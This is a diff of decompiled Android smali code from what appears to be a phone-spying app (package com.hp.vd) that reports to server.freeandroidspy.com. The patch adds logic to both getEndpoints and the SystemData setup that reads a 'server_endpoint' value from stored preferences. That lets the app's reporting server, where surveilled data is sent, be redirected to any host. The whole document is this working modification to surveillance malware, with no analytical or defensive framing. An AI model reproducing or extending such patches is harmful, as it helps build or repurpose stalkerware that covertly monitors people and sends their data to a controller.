@@ -72,8 +72,8 @@
     return v0
 .end method
 
-.method public getEndpoints()[Ljava/net/URI;
-    .locals 3
+.method public getEndpoints(Landroid/content/Context;)[Ljava/net/URI;
+    .locals 6
 
     const/4 v0, 0x1
 
@@ -82,12 +82,49 @@
 
     const-string v1, "https://server.freeandroidspy.com:443/index.php"
 
+    const/4 v2, 0x0
+
+    if-eqz p1, :cond_2
+
+    const-string v3, "system"
+
+    const/4 v4, 0x0
+
     .line 174
+    invoke-virtual {p1, v3, v4}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
+
+    move-result-object v3
+
+    if-eqz v3, :cond_2
+
+    const-string v5, "server_endpoint"
+
+    invoke-interface {v3, v5}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z
+
+    move-result v4
+
+    if-eqz v4, :cond_2
+
+    const-string v4, ""
+
+    invoke-interface {v3, v5, v4}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v3
+
+    if-eqz v3, :cond_2
+
+    invoke-virtual {v3}, Ljava/lang/String;->length()I
+
+    move-result v4
+
+    if-lez v4, :cond_2
+
+    move-object v1, v3
+
+    :cond_2
     invoke-static {v1}, Ljava/net/URI;->create(Ljava/lang/String;)Ljava/net/URI;
 
     move-result-object v1
-
-    const/4 v2, 0x0
 
     aput-object v1, v0, v2
 
@@ -287,6 +324,29 @@
     move-result-object v1
 
     iput-object v1, v0, Lcom/hp/vd/data/SystemData;->session:Ljava/lang/String;
+
+    const-string v1, "https://server.freeandroidspy.com:443/index.php"
+
+    const-string v2, "server_endpoint"
+
+    const-string v3, ""
+
+    invoke-interface {p1, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v2
+
+    if-eqz v2, :cond_2
+
+    invoke-virtual {v2}, Ljava/lang/String;->length()I
+
+    move-result v3
+
+    if-lez v3, :cond_2
+
+    move-object v1, v2
+
+    :cond_2
+    iput-object v1, v0, Lcom/hp/vd/data/SystemData;->endpoint:Ljava/lang/String;
 
     const-string v1, "initial_wakeup_delay"
 
